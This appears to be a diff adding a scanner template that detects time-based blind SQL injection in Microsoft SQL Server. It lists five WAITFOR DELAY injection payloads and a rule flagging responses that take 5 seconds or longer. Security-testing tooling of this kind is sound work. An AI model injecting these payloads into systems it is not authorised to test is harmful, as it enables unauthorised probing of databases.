@@ -1,0 +1,21 @@
+id: sqli-mssql-time-based
+name: "MSSQL Time-Based Blind SQL Injection"
+category: sqli
+severity: high
+tags: [sqli, blind, time-based, mssql]
+author: "Quickfire"
+description: "Detects time-based blind SQL injection vulnerabilities in Microsoft SQL Server. Injects WAITFOR DELAY payloads and measures the response time."
+injection_strategy: APPEND
+
+payloads:
+  - ";waitfor delay '0:0:5' -- "
+  - "';waitfor delay '0:0:5' -- "
+  - ");waitfor delay '0:0:5' -- "
+  - "');waitfor delay '0:0:5' -- "
+  - "));waitfor delay '0:0:5' -- "
+
+detection:
+  baseline: false
+  rules:
+    - type: response_time
+      minMs: 5000
